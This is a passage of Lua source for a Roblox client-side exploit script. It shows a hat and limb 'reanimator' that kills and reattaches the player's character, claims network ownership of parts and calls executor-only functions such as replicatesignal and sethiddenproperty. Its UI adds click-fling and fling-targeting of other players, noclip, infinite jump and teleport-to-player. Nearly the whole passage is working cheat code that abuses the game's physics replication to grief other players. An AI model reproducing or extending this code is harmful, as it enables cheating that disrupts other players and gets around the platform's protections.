		HatReanimator.Status.RespawnFling = "Done."
		local lgloop = nil
		local bringconns = {}
		local readystate = 0
		if perma then task.wait(1) end
		local backpack = Player:FindFirstChildOfClass("Backpack")
		local tools = GetTools()
		if backpack then
			for _=1, 3 do
				for _,tool in tools do
					tool.Parent = character
				end
				for _,tool in tools do
					tool.Parent = backpack
				end
			end
		end
		lgloop = RunService.Heartbeat:Connect(function(dt)
			selhatcol.HRPTP(dt, character, Humanoid, RootPosition, RootPart, readystate)
		end)
		if hatcols then task.wait(0.2) end
		HatReanimator.Status.ReanimState = "Loading Permadeath."
		if perma then
			HatReanimator.Status.Permadeath = "no."
		else
			HatReanimator.Status.Permadeath = "Disabled, nothing to do."
		end
		if not character:IsDescendantOf(workspace) then
			lgloop:Disconnect()
			return
		end
		readystate = 1
		HatReanimator.Status.ReanimState = "Reanimate State: 1"
		if not selhatcol.ColLimb then
			Humanoid:ChangeState(Enum.HumanoidStateType.Physics)
		end
		NumHats = #CharHats
		selhatcol.State1(character, Humanoid, CharHats)
		local claimarea = RootPart.CFrame.Position + RootPart.CFrame.LookVector * 8
		claimarea = Vector3.new(claimarea.X, math.max(FallenPartsDestroyHeight + 16, claimarea.Y + 4), claimarea.Z)
		task.wait(selhatcol.Wait1 or 0.1)
		if not character:IsDescendantOf(workspace) then
			lgloop:Disconnect()
			return
		end
		readystate = 2
		HatReanimator.Status.ReanimState = "Reanimate State: 2"
		for _,hat in CharHats do
			local handle = hat:FindFirstChild("Handle")
			if handle and handle:IsA("BasePart") then
				table.insert(bringconns, RunService.Heartbeat:Connect(function(dt)
					if handle:IsDescendantOf(workspace) and IsNetworkOwner(handle) then
						handle.CFrame = CFrame.new(claimarea)
						handle.Velocity = Vector3.new(0, 67, 0)
						handle.RotVelocity = Vector3.new(0, 0, 0)
					end
				end))
				for _,v in handle:GetChildren() do
					if v:IsA("JointInstance") then v:Destroy() end
					if v:IsA("Constraint") then v.Enabled = false end
					if v:IsA("Attachment") then
						v.Archivable = true
						local w = v:Clone()
						v:Destroy()
						w.Parent = handle
					end
				end
				handle:SetAttribute("_Uhhhhhh_HasCollide", false)
			end
		end
		Humanoid:ChangeState(Enum.HumanoidStateType.FallingDown)
		task.wait(selhatcol.Wait2 or 0.15)
		if not character:IsDescendantOf(workspace) then
			lgloop:Disconnect()
			for _,c in bringconns do
				c:Disconnect()
			end
			return
		end
		AvatarEditorService:BustAvatarFetchCache()
		pcall(replicatesignal, Humanoid.ServerBreakJoints)
		Humanoid.EvaluateStateMachine = true
		Humanoid.BreakJointsOnDeath = true
		Humanoid.Health = 0
		Humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
		Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
		readystate = 3
		HatReanimator.Status.ReanimState = "Reanimate State: 3"
		IsRespawning = false
		if hatcols then
			local stateunlocked = false
			task.spawn(function()
				local collidable = selhatcol.State2(character, CharHats)
				stateunlocked = true
				local atleast = 0
				if SaveData.Reanimator.IWantHatCollide == 1 then
					atleast = 1
				end
				if SaveData.Reanimator.IWantHatCollide == 2 then
					atleast = #CharHats - 3
				end
				if SaveData.Reanimator.IWantHatCollide == 3 then
					atleast = #CharHats - 2
				end
				if SaveData.Reanimator.IWantHatCollide == 4 then
					atleast = #CharHats - 1
				end
				if hatcols and collidable <= atleast then
					if perma then
						HatReanimator.Status.Permadeath = "No hat collide. Respawning!"
						Respawn()
					end
				end
			end)
			repeat task.wait() until stateunlocked or not character:IsDescendantOf(workspace)
			--task.wait(0.25)
		end
		if backpack then
			for _,tool in tools do
				tool.Parent = Humanoid
				tool.Parent = character
				tool.Parent = backpack
			end
		end
		lgloop:Disconnect()
		if perma then task.wait(1) end
		for _,c in bringconns do
			c:Disconnect()
		end
		if not character:IsDescendantOf(workspace) then
			return
		end
		HatReanimator.Status.ReanimState = "Done."
		if #CharHats == 0 then
			if perma then
				HatReanimator.Status.Permadeath = "All hats died. Respawning!"
				Respawn()
			end
		end
		if perma and hatcols then
			if HatReanimator.IWantAllHats and NumHats > #CharHats then
				if perma then
					HatReanimator.Status.Permadeath = "Some hats died. Respawning!"
					Respawn()
				end
			else
				NumHats = #CharHats
			end
		end
		--pcall(function() Player.ReplicationFocus = nil end)
		CurrentCharacter = character
		task.wait()
		if backpack then
			for _,tool in tools do
				local i = table.find(toolnames, tool.Name)
				if i then
					table.remove(toolnames, i)
					tool.Parent = character
				end
			end
		end
	end

	local CharConn = Player.CharacterAdded:Connect(OnCharacter)

	if Player.Character then
		local h = Player.Character:FindFirstChildOfClass("Humanoid")
		if h and h.RootPart then
			InitCFrame = h.RootPart.CFrame
			pcall(function() Player.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead) end)
			pcall(function() Player.Character.Humanoid.Health = 0 end)
			pcall(replicatesignal, Player.Character.Humanoid.ServerBreakJoints)
			--pcall(replicatesignal, Player.ConnectDiedSignalBackend)
			Player.Character.DescendantAdded:Connect(CharOnDesc)
			for _,v in Player.Character:GetDescendants() do
				CharOnDesc(v)
			end
			CurrentCharacter = Player.Character
		end
	end

	Reanimate.CreateCharacter(InitCFrame)

	Reanimate.Starting = false
	local letitgo = 0
	while not Reanimate.Stopping do
		RunService.PreSimulation:Wait()
		workspace.FallenPartsDestroyHeight = 0/0
		SetSimulationRadius()
		debug.profilebegin("Uhhhhhh > CharacterCheck")
		local ReanimOkay = false
		local Character = Player.Character
		local ReanimCharacter = Reanimate.Character
		if Character and Character:IsDescendantOf(workspace) then
			if CurrentCharacter == Character then
				if #CharHats > 0 then
					ReanimOkay = true
				end
				if HatReanimator.HasPermadeath and not IsRespawning and HatReanimator.IWantAllHats then
					if NumHats > #CharHats then
						HatReanimator.Status.Permadeath = "Some hats died. Respawning!"
						Respawn()
					else
						local midpoint = Vector3.zero
						local hatsowned = 0
						local hatsnotowned = {}
						for _,v in CharHats do
							local h = v:FindFirstChild("Handle")
							if h and h:IsA("BasePart") then
								if IsNetworkOwner(h) then
									midpoint += h.Position
									hatsowned += 1
								else
									table.insert(hatsnotowned, h)
								end
							end
						end
						midpoint /= hatsowned
						for _,v in hatsnotowned do
							if (v.Position - midpoint).Magnitude > 2000 then
								HatReanimator.Status.Permadeath = "Some hats unclaimable. Respawning!"
								Respawn()
								break
							end
						end
						hatsnotowned = nil
					end
				end
			end
			local Humanoid = Character:FindFirstChildOfClass("Humanoid")
			if Humanoid then
				if Humanoid.WalkSpeed < 1 then
					Humanoid.WalkSpeed = 16
				end
				if Humanoid.JumpPower < 1 then
					Humanoid.JumpPower = 50
				end
				if Camera then
					if (ReanimOkay and ReanimCharacter) or not HatReanimator.Permadeath then
						Camera.CameraSubject = ReanimCharacter:FindFirstChildOfClass("Humanoid")
					else
						Camera.CameraSubject = Humanoid
					end
				end
			end
		end
		debug.profileend()
		debug.profilebegin("Uhhhhhh > BaseParts")
		local RCRootPart = ReanimCharacter and ReanimCharacter:FindFirstChild("HumanoidRootPart")
		local ltm = Reanimate.LocalTransparencyModifier
		for _,v in BaseParts do
			v.CanCollide = false
			v.LocalTransparencyModifier = ltm
		end
		debug.profileend()
		debug.profilebegin("Uhhhhhh > ReanimOkay")
		local t = os.clock()
		local slocked = {}
		if ReanimOkay then
			local dt = RunService.Heartbeat:Wait()
			if HatReanimator.RebuildRequired then
				RefreshHatMap(Character)
			end
			if RCRootPart then
				local rightarm = ReanimCharacter:FindFirstChild("Right Arm") or RCRootPart
				local rightgrip = Util.ScaleCFrame(RIGHTGRIP_C0, Reanimate.CharacterScale)
				local claimoverride = nil
				local toolequipped = false
				local toolactivate = false
				local toolactivated = nil
				local handlethese = {}
				debug.profilebegin("Uhhhhhh > CharTools")
				for _,v in CharTools do
					local handle = v:FindFirstChild("Handle")
					if handle and handle:IsA("BasePart") then
						handle.CanCollide = false
						handle.LocalTransparencyModifier = ltm
						if HatReanimator.ToolHolding then
							handlethese[handle] = rightarm.CFrame * rightgrip * v.Grip:Inverse()
						else
							handlethese[handle] = RCRootPart.CFrame + Vector3.new(0, -12, 0)
						end
						if not IsNetworkOwner(handle) then
							local a = Player:GetNetworkPing() + 0.2 + math.sin(t * 30) * 0.2
							claimoverride = handle.CFrame
							claimoverride += handle.Velocity * a
							claimoverride += Vector3.new(0, -workspace.Gravity, 0) * 0.5 * a * a
						end
					end
					if not v:GetAttribute("_Uhhhhhh_ActivateConn") then
						v:SetAttribute("_Uhhhhhh_ActivateConn", true)
						v.Activated:Connect(function()
							v:SetAttribute("_Uhhhhhh_Activate", true)
						end)
					end
					if v:GetAttribute("_Uhhhhhh_Activate") then
						v:SetAttribute("_Uhhhhhh_Activate", nil)
						toolactivate = true
						toolactivated = v
					end
					v.Enabled = true
					v.RequiresHandle = false
					v.ManualActivationOnly = false
				end
				if #CharTools > 0 and HatReanimator.ToolHolding then
					local FakeTool = ReanimCharacter:FindFirstChildOfClass("Tool")
					if not FakeTool then
						toolequipped = true
						FakeTool = Instance.new("Tool")
						FakeTool.Name = "faketool"
						local FakeToolHandle = Instance.new("Part")
						FakeToolHandle.Name = "Handle"
						FakeToolHandle.Transparency = 1
						FakeToolHandle.Color = Color3.new(0, 0, 1)
						FakeToolHandle.CanCollide = false
						FakeToolHandle.Massless = true
						FakeToolHandle.Parent = FakeTool
						FakeTool.Parent = ReanimCharacter
						local RightGrip = Instance.new("Weld")
						RightGrip.Name = "RightGrip"
						RightGrip.Parent = FakeToolHandle
						RightGrip.Part0 = rightarm
						RightGrip.Part1 = FakeToolHandle
						RightGrip.C0 = RIGHTGRIP_C0
						Util.LinkDestroyI2C(FakeTool, FakeTool:GetPropertyChangedSignal("Grip"):Connect(function()
							RightGrip.C1 = FakeTool.Grip
						end))
						RightGrip.C1 = FakeTool.Grip
					end
					if HatReanimator.ToolAnimMethod == 1 then
						if toolequipped then
							local sound = Instance.new("Sound")
							sound.Name = "snd"
							sound.SoundId = "rbxasset://sounds/unsheath.wav"
							sound.Volume = 1
							sound.Parent = FakeTool:FindFirstChild("Handle")
							sound:Play()
							Debris:AddItem(sound, 1)
						end
						if toolactivate then
							local newuse = FakeTool:GetAttribute("_Uhhhhhh_Sword_CD") or 0
							local lastuse = FakeTool:GetAttribute("_Uhhhhhh_Sword_LU") or 0
							if t > newuse then
								if t - lastuse < 0.2 then
									newuse = t + 1
									local toolanim = Instance.new("StringValue")
									toolanim.Name = "toolanim"
									toolanim.Value = "Lunge"
									toolanim.Parent = FakeTool
									local sound = Instance.new("Sound")
									sound.Name = "snd"
									sound.SoundId = "rbxasset://sounds/swordlunge.wav"
									sound.Volume = 1
									sound.Parent = FakeTool:FindFirstChild("Handle")
									sound:Play()
									Debris:AddItem(toolanim, 1)
									Debris:AddItem(sound, 1)
									task.spawn(function(v)
										v.GripForward = Vector3.new(0, 0, 1)
										v.GripRight = Vector3.new(0, -1, 0)
										v.GripUp = Vector3.new(-1, 0, 0)
										task.wait(1)
										v.GripForward = Vector3.new(-1, 0, 0)
										v.GripRight = Vector3.new(0, 1, 0)
										v.GripUp = Vector3.new(0, 0, 1)
									end, toolactivated)
								else
									newuse = t + 0.05
									local toolanim = Instance.new("StringValue")
									toolanim.Name = "toolanim"
									toolanim.Value = "Slash"
									toolanim.Parent = FakeTool
									local sound = Instance.new("Sound")
									sound.Name = "snd"
									sound.SoundId = "rbxasset://sounds/swordslash.wav"
									sound.Volume = 1
									sound.Parent = FakeTool:FindFirstChild("Handle")
									sound:Play()
									Debris:AddItem(toolanim, 1)
									Debris:AddItem(sound, 1)
								end
								lastuse = t
							end
							FakeTool:SetAttribute("_Uhhhhhh_Sword_CD", newuse)
							FakeTool:SetAttribute("_Uhhhhhh_Sword_LU", lastuse)
						end
					end
				else
					local FakeTool = ReanimCharacter:FindFirstChildOfClass("Tool")
					if FakeTool then FakeTool:Destroy() end
				end
				debug.profileend()
				debug.profilebegin("Uhhhhhh > FlingLogic")
				local flingtarget = nil
				local flingcf, flinged = CFrame.identity, true
				if t > letitgo then
					flingtarget = HatReanimator.FlingTargets[1]
					if flingtarget then
						if - HatReanimator.FlingMethod == 0 then
							Respawn()
							flingtarget.Time = nil
							flingtarget = nil
						else
							if flingtarget.Time then
								if t > flingtarget.Time then
									table.remove(HatReanimator.FlingTargets, 1)
									flingtarget = nil
								end
							else
								flingtarget.Time = t + (flingtarget.Duration or (Reanimate.UsePhysicsRepRootPart and Reanimate.PhysicsRepRootPartFling or 2))
							end
						end
					end
					if flingtarget then
						flingcf, flinged = Util.PredictionFling(flingtarget.Target)
						if flinged then
							table.remove(HatReanimator.FlingTargets, 1)
							flingtarget = nil
							letitgo = t + 0.1
						end
					end
				end
				local blacklist = {}
				if flingtarget then
					local flingpart = Reanimate.UsePhysicsRepRootPart and Util.PredictionFlingPart(flingtarget.Target) or nil
					if HatReanimator.FlingMethod == 1 then
						local biggest = nil
						local biggesthat = nil
						local biggestarea = 0
						for _,hat in CharHats do
							local handle = hat:FindFirstChild("Handle")
							if handle and handle:IsA("BasePart") and handle:GetAttribute("_Uhhhhhh_HasCollide") and IsNetworkOwner(handle) then
								local area = handle.Size.X * handle.Size.Y * handle.Size.Z
								if biggestarea < area then
									biggest = handle
									biggesthat = hat
									biggestarea = area
								end
							end
						end
						if biggesthat then
							blacklist[biggesthat] = true
							SetUACFrameNetless(biggest, dt, flingcf, Vector3.zero, false, true)
							pcall(sethiddenproperty, biggest, "PhysicsRepRootPart", Reanimate.UsePhysicsRepRootPart and flingpart or nil)
						end
					end
					if HatReanimator.FlingMethod == 2 then
						local collide = false
						for _,hat in CharHats do
							local handle = hat:FindFirstChild("Handle")
							if handle and handle:IsA("BasePart") then
								if handle:GetAttribute("_Uhhhhhh_HasCollide") then
									collide = true
								end
							end
						end
						if collide then
							for _,hat in CharHats do
								local handle = hat:FindFirstChild("Handle")
								if handle and handle:IsA("BasePart") then
									blacklist[hat] = true
									SetUACFrameNetless(handle, dt, flingcf, Vector3.zero, false, true)
									pcall(sethiddenproperty, handle, "PhysicsRepRootPart", Reanimate.UsePhysicsRepRootPart and flingpart or nil)
								end
							end
						end
					end
					if HatReanimator.FlingMethod == 3 then
						for handle, cf in handlethese do
							blacklist[handle] = true
							SetUACFrameNetless(handle, dt, flingcf, Vector3.zero, false, true)
							pcall(sethiddenproperty, handle, "PhysicsRepRootPart", Reanimate.UsePhysicsRepRootPart and flingpart or nil)
						end
					end
				end
				debug.profileend()
				debug.profilebegin("Uhhhhhh > Alignments")
				for _,hat in CharHats do
					local handle = hat:FindFirstChild("Handle")
					if handle and handle:IsA("BasePart") then
						handle.CanCollide = false
						local lltm = ltm
						if Reanimate.FirstPersonBody then
							if not handle:GetAttribute("AttachHead") then
								lltm = 0
							end
						end
						handle.LocalTransparencyModifier = lltm
						local ref = Hat2HatRefs[hat]
						if blacklist[hat] then
							if ref then ref.Aligned = false end
						else
							if claimoverride then
								SetUACFrameNetless(handle, dt, claimoverride, Vector3.zero, false, false)
								pcall(sethiddenproperty, handle, "PhysicsRepRootPart", nil)
								if ref then ref.Aligned = false end
							else
								local mapped = nil
								if ref then
									mapped = GetHatMappedOverride(ref.Map)
								else
									RefHatToHatRefs(hat)
								end
								local tcf, tvel = GetHatMappedCFrame(mapped)
								tcf = tcf or RCRootPart.CFrame * CFrame.new(0, 5, 0)
								tvel = tvel or Vector3.zero
								local aligned = SetUACFrameNetless(handle, dt, tcf, tvel, HatReanimator.HatFling, HatReanimator.HatSpin)
								if aligned then
									table.insert(slocked, handle)
								end
								if ref then ref.Aligned = aligned end
								pcall(sethiddenproperty, handle, "PhysicsRepRootPart", mapped and mapped.RepRootPart)
							end
						end
					end
				end
				for handle, cf in handlethese do
					if not blacklist[handle] then
						if SetUACFrameNetless(handle, dt, cf, rightarm.Velocity, HatReanimator.HatFling, HatReanimator.HatSpin) then
							table.insert(slocked, handle)
						end
					end
				end
				debug.profileend()
			end
		else
			if CurrentCharacter then
				CurrentCharacter = nil
				--replicatesignal(Player.ConnectDiedSignalBackend)
			end
		end
		debug.profilebegin("Uhhhhhh > Placeholders")
		for _,ref in HatRefs do
			local ph = ref.PH
			if ph then
				if ReanimOkay and ref.Hat and ref.Aligned then
					ph.Transparency = 1
				else
					local tcf, _ = GetHatMappedCFrame(GetHatMappedOverride(ref.Map))
					if tcf then
						local lltm = ltm
						if Reanimate.FirstPersonBody then
							if not ph:GetAttribute("AttachHead") then
								lltm = 0
							end
						end
						ph.CFrame = tcf
						ph.Transparency = 1 - (1 - Reanimate.PlaceholderTransparency) * (1 - lltm)
						table.insert(slocked, ph)
					end
				end
			end
		end
		debug.profileend()
		RunService.PreRender:Wait()
		debug.profilebegin("Uhhhhhh > PreRender")
		if RCRootPart and Reanimate:ShouldRotationType() then
			Reanimate:CameraLockCharacter()
		end
		for _,ref in HatRefs do
			local ph = ref.PH
			if ph then
				if ReanimOkay and ref.Hat and ref.Aligned then else
					local tcf, _ = GetHatMappedCFrame(GetHatMappedOverride(ref.Map))
					if tcf then
						ph.CFrame = tcf
					end
				end
			end
		end
		if HatReanimator.HatSpin then
			for _,handle in slocked do
				if math.random() < 0.5 then
					handle.CFrame = handle.CFrame * CFrame.Angles(math.random() * 2 * math.pi, math.random() * 2 * math.pi, math.random() * 2 * math.pi)
				end
			end
		end
		debug.profileend()
	end
	ResetHatRefs()
	for _,v in HatRefs do if v.PH then v.PH:Destroy() end end
	CharConn:Disconnect()
	--replicatesignal(Player.ConnectDiedSignalBackend)
	Reanimate.Stopping = false
	Reanimate.DestroyCharacter()
end

task.wait()
local function ReanimateShowHitboxes()
	local Reanimator = Reanimate.Current
	if Reanimator and Reanimator.ShowHitboxes then
		Reanimator.ShowHitboxes()
	end
end
local function ReanimateFling(target, duration)
	local Reanimator = Reanimate.Current
	if Reanimator and Reanimator.Fling then
		return Reanimator.Fling(target, duration)
	end
	return false
end
-- SetCharacter thing, very empyrean-like system
_G_Uhhhhhh.Fling = function(part)
	if part and part.Parent then
		if part:IsA("BasePart") then
			part = part.Parent
			if part:IsA("Accessory") or part:IsA("Tool") then
				part = part.Parent
			end
		end
		local hum = part:FindFirstChildOfClass("Humanoid")
		if hum and hum.RootPart and not hum.RootPart:IsGrounded() then
			return ReanimateFling(part)
		end
	end
end

do
	SaveData.SelectedReanimator = SaveData.SelectedReanimator or 1
	local ReanimateMethodSelect = UI.CreateDropdown(MainPage, "Reanimator", {"Limb Reanimator", "Hats Reanimator"}, SaveData.SelectedReanimator)
	local ReanimatorConfigTitle = UI.CreateText(MainPage, "-=+ Limb Reanimator Config +=-", 15, Enum.TextXAlignment.Center)
	local SelectedReanimator = LimbReanimator
	if SaveData.SelectedReanimator == 2 then
		SelectedReanimator = HatReanimator
		ReanimatorConfigTitle.Text = "-=+ Hats Reanimator Config +=-"
	end
	local ReanimatorConfigCanvas = UI.CreateCanvas(MainPage)
	ReanimateMethodSelect.Changed:Connect(function(value)
		SaveData.SelectedReanimator = value
		if value == 1 then
			SelectedReanimator = LimbReanimator
			ReanimatorConfigTitle.Text = "-=+ Limb Reanimator Config +=-"
		end
		if value == 2 then
			SelectedReanimator = HatReanimator
			ReanimatorConfigTitle.Text = "-=+ Hats Reanimator Config +=-"
		end
		Util.ClearAllChildrenGui(ReanimatorConfigCanvas)
		SelectedReanimator.Config(ReanimatorConfigCanvas)
	end)
	SelectedReanimator.Config(ReanimatorConfigCanvas)
	UI.CreateText(MainPage, " ", 5, Enum.TextXAlignment.Center)
	local ReanimateText = UI.CreateText(MainPage, "Running: NONE", 15, Enum.TextXAlignment.Center)
	local ReanimateStartButton, ReanimateStartButtonText = UI.CreateButton(MainPage, "* Reanimate *", 20)
	ReanimateStartButton.Activated:Connect(function()
		ReanimateStartButton.Interactable = false
		if Reanimate.Current then
			ReanimateStartButtonText.Text = "Stopping..."
			Reanimate.Stopping = true
			repeat task.wait() until not Reanimate.Stopping
			Reanimate.Current.Running = nil
			Reanimate.Current = nil
			HumanoidLASetHookState(false)
			ReanimateText.Text = "Running: NONE"
			task.wait(1)
			ReanimateStartButtonText.Text = "* Reanimate *"
		else
			ReanimateStartButtonText.Text = "Starting..."
			Reanimate.Starting = true
			Reanimate.Current = SelectedReanimator
			HumanoidLASetHookState(Reanimate.UseLoadAnimationHook)
			ReanimateText.Text = "Running: " .. Reanimate.Current.Name
			task.spawn(Reanimate.Current.Start)
			repeat task.wait() until not Reanimate.Starting
			Reanimate.Current.Running = true
			task.wait(1)
			ReanimateStartButtonText.Text = "* Deanimate *"
		end
		ReanimateStartButton.Interactable = true
	end)
	UI.CreateButton(MainPage, "Show Reanimate Hitboxes", 15).Activated:Connect(function()
		if not Reanimate.Character then return end
		ReanimateShowHitboxes()
	end)
	UI.CreateButton(MainPage, "Refresh Reanimate Character", 10).Activated:Connect(function()
		if not Reanimate.Character then return end
		Reanimate.CreateCharacter()
	end)
end
UI.CreateSeparator(MainPage)

do
	UI.CreateText(MainPage, "Reanimate Character Settings", 15, Enum.TextXAlignment.Center)
	UI.CreateSwitch(MainPage, "Infinite Jump", Reanimate.InfiniteJump).Changed:Connect(function(val)
		Reanimate.InfiniteJump = val
		SaveData.NoInfiniteJump = not val
	end)
	UI.CreateSwitch(MainPage, "Noclip", Reanimate.Noclip).Changed:Connect(function(val)
		Reanimate.Noclip = val
		SaveData.NoclipEnabled = val
	end)
	UI.CreateSwitch(MainPage, "Smooth Camera", Reanimate.SmoothCam).Changed:Connect(function(val)
		Reanimate.SmoothCam = val
		SaveData.NoSmoothCam = not val
	end)
	UI.CreateSwitch(MainPage, "First Person Body", Reanimate.FirstPersonBody).Changed:Connect(function(val)
		Reanimate.FirstPersonBody = val
		SaveData.FirstPersonBody = not val
	end)
	UI.CreateSwitch(MainPage, "Allow Shiftlock", Reanimate.ShiftlockEnabled).Changed:Connect(function(val)
		Reanimate.ShiftlockEnabled = val
		SaveData.ShiftlockDisabled = not val
	end)
	UI.CreateSwitch(MainPage, "Can Sit on Seats", Reanimate.SeatSit).Changed:Connect(function(val)
		Reanimate.SeatSit = val
		SaveData.NoSeatSitEnabled = not val
	end)
	UI.CreateSwitch(MainPage, "Can Pickup Tools", Reanimate.ToolGrab).Changed:Connect(function(val)
		Reanimate.ToolGrab = val
		SaveData.ToolGrabEnabled = val
	end)
	UI.CreateSwitch(MainPage, "Apply Scale to Gravity", Reanimate.ScaleGravity).Changed:Connect(function(val)
		Reanimate.ScaleGravity = val
		SaveData.ScaleGravityEnabled = val
	end)
	UI.CreateSwitch(MainPage, "Void Float", Reanimate.PatchmaVoidFloat).Changed:Connect(function(val)
		Reanimate.PatchmaVoidFloat = val
		SaveData.PatchmaVoidFloat = val
	end)
	UI.CreateButton(MainPage, "Force Sit (2x to remove gyro)", 20).Activated:Connect(function()
		local ch = Reanimate.Character or Player.Character
		if ch then
			local h = ch:FindFirstChildOfClass("Humanoid")
			local r = h and h.RootPart
			if h and r then
				h.Sit = true
				if r:FindFirstChild("SeatGyro") then
					r.SeatGyro:Destroy()
				else
					local g = Instance.new("BodyGyro")
					g.Name = "SeatGyro"
					g.CFrame = r.CFrame
					g.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
					g.Parent = r
					Util.LinkDestroyI2C(g, h:GetPropertyChangedSignal("Sit"):Once(function()
						g:Destroy()
					end))
				end
			end
		end
	end)
	local CharacterScaleSlider = UI.CreateSlider(MainPage, "Character Scale", Reanimate.CharacterScale, 0.5, 5, 0.5)
	CharacterScaleSlider.Changed:Connect(function(val)
		val = math.clamp(val, 0.001, 20)
		CharacterScaleSlider.Value = val
		Reanimate.CharacterScale = val
		SaveData.CharacterScale = val
	end)
	local PlaceholderTransparencySlider = UI.CreateSlider(MainPage, "Placeholders", Reanimate.PlaceholderTransparency, 0, 1, 0.05)
	PlaceholderTransparencySlider.Changed:Connect(function(val)
		val = math.clamp(val, 0, 1)
		PlaceholderTransparencySlider.Value = val
		Reanimate.PlaceholderTransparency = val
		SaveData.PlaceholderTransparency = val
	end)
	UI.CreateSeparator(MainPage)
	local function ReanimCharacterTeleport(pos)
		local ch = Reanimate.Character or Player.Character
		if ch then
			local h = ch:FindFirstChildOfClass("Humanoid")
			local r = h and h.RootPart
			if h and r then
				r.CFrame = r.CFrame.Rotation + pos
				r.Velocity = Vector3.zero
				r.RotVelocity = Vector3.zero
			end
		end
	end
	UI.CreateSwitch(MainPage, "Click Fling", Reanimate.ClickFling).Changed:Connect(function(val)
		Reanimate.ClickFling = val
		SaveData.ClickFlingEnabled = val
	end)
	UI.CreateSwitch(MainPage, "Key+Click Teleport", Reanimate.CtrlClick).Changed:Connect(function(val)
		Reanimate.CtrlClick = val
		SaveData.CtrlClickEnabled = val
	end)
	local selectedkey = Enum.KeyCode.LeftControl
	SaveData.CtrlClickKey = SaveData.CtrlClickKey or 1
	local function updatekey()
		local val = SaveData.CtrlClickKey
		if val == 1 then
			selectedkey = Enum.KeyCode.LeftControl
		end
		if val == 2 then
			selectedkey = Enum.KeyCode.RightBracket
		end
		if val == 3 then
			selectedkey = Enum.KeyCode.Tab
		end
		if val == 4 then
			selectedkey = Enum.KeyCode.Z
		end
		if val == 5 then
			selectedkey = Enum.KeyCode.X
		end
		if val == 6 then
			selectedkey = Enum.KeyCode.F
		end
		if val == 7 then
			selectedkey = Enum.KeyCode.T
		end
	end
	updatekey()
	UI.CreateDropdown(MainPage, "TP Key", {
		"Left Ctrl (default)", "inno's pick (']')", "Tab (idk)",
		"Z", "X (i like this one on pc)", "F", "T",
	}, SaveData.CtrlClickKey).Changed:Connect(function(val)
		SaveData.CtrlClickKey = val
		updatekey()
	end)
	local Maus = Player:GetMouse()
	local HoldingCtrl = UI.CreateSwitch(MainPage, "TP Key Held", false)
	local _lastclick = nil
	local _lastclickgpe = false
	local _lastclicktick = 0
	local _lastclickpos = Vector3.zero
	UserInputService.InputBegan:Connect(function(input, gpe)
		if input.UserInputType == Enum.UserInputType.Keyboard then
			if input.KeyCode == selectedkey then
				HoldingCtrl.Value = true
			end
		end
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			_lastclick = input
			_lastclickgpe = gpe
			_lastclicktick = os.clock()
			_lastclickpos = input.Position
		end
	end)
	UserInputService.InputEnded:Connect(function(input, gpe)
		if input.UserInputType == Enum.UserInputType.Keyboard then
			if input.KeyCode == selectedkey then
				HoldingCtrl.Value = false
			end
		end
		if _lastclick and _lastclick == input and not _lastclickgpe then
			if input.UserInputType == Enum.UserInputType.MouseButton1 or (os.clock() - _lastclicktick < 0.3 and (input.Position - _lastclickpos).Magnitude < 10) then
				if Reanimate.CtrlClick and HoldingCtrl.Value then
					if Maus.Target and Maus.Target.Parent then
						ReanimCharacterTeleport(Maus.Hit.Position + Vector3.new(0, 3, 0))
						return
					end
				end
				if Reanimate.ClickFling then
					if Maus.Target and Maus.Target.Parent then 
						local target = Maus.Target.Parent
						if target:IsA("Accessory") then
							target = target.Parent
						end
						if target:FindFirstChildOfClass("Humanoid") then
							if ReanimateFling(target) then return end
						end
					end
				end
			end
		end
	end)
	UI.CreateButton(MainPage, "Teleport to 0, highest, 0", 20).Activated:Connect(function()
		local hit = workspace:Raycast(Vector3.new(0, 4500, 0), Vector3.new(0, -4500 + FallenPartsDestroyHeight, 0))
		if hit and hit.Position == hit.Position then
			ReanimCharacterTeleport(hit.Position + Vector3.new(0, 5, 0))
		else
			ReanimCharacterTeleport(Vector3.new(0, 0, 0))
		end
	end)
	UI.CreateButton(MainPage, "Teleport to 'LastSafe'", 20).Activated:Connect(function()
		ReanimCharacterTeleport(Vector3.new(0, FallenPartsDestroyHeight - 5000, 0))
	end)
	local TeleportToPlayerSel = UI.CreateText(MainPage, "<font color=\"#AAAAAA\">(enter a player name)</font>", 15, Enum.TextXAlignment.Center)
	local TeleportToPlayer = UI.CreateTextbox(MainPage, "", "Teleport To Player", 20)
	TeleportToPlayer:GetPropertyChangedSignal("Text"):Connect(function()
		local sel = Util.QueryPlayerSelector(TeleportToPlayer.Text)
		if sel then
			TeleportToPlayerSel.Text = `{sel.DisplayName} (@{sel.Name})`
		else
			if #TeleportToPlayer.Text == 0 then
				TeleportToPlayerSel.Text = "<font color=\"#AAAAAA\">(enter a player name)</font>"
			else
				TeleportToPlayerSel.Text = "<font color=\"#FF7777\">(player not found)</font>"
			end
		end
	end)
	TeleportToPlayer.FocusLost:Connect(function(enter)
		if enter then
			local sel = Util.QueryPlayerSelector(TeleportToPlayer.Text)
			if sel and sel.Character then
				local r = sel.Character:FindFirstChild("LowerTorso") or sel.Character:FindFirstChild("Torso")
				if r and r:IsA("BasePart") then
					ReanimCharacterTeleport(r.CFrame.Position)
				end
			end
			TeleportToPlayer.Text = ""
		end
	end)
end
UI.CreateSeparator(MainPage)
do
	UI.CreateText(MainPage, "Internals Settings", 15, Enum.TextXAlignment.Center)
	UI.CreateSwitch(MainPage, "Hook LoadAnimation", Reanimate.UseLoadAnimationHook).Changed:Connect(function(val)
		Reanimate.UseLoadAnimationHook = val
		SaveData.NoLoadAnimationHook = not val
	end)
	if ismissing(hookmetamethod) or ismissing(hookfunction) then
		UI.CreateText(MainPage, "^ this option will not work for you", 10, Enum.TextXAlignment.Center)
	end
	UI.CreateSwitch(MainPage, "Use Physics Glue", Reanimate.UsePhysicsRepRootPart).Changed:Connect(function(val)
		Reanimate.UsePhysicsRepRootPart = val
		SaveData.NoPhysicsRepRootPart = not val
	end)
	UI.CreateText(MainPage, "internals for physics based reanimation\n(like hat reanimator)", 10, Enum.TextXAlignment.Center)
	UI.CreateSwitch(MainPage, "Patchma-like Netless", Reanimate.UsePatchmaLikeNetless).Changed:Connect(function(val)
		Reanimate.UsePatchmaLikeNetless = val
		SaveData.UsePatchmaLikeNetless = val
	end)
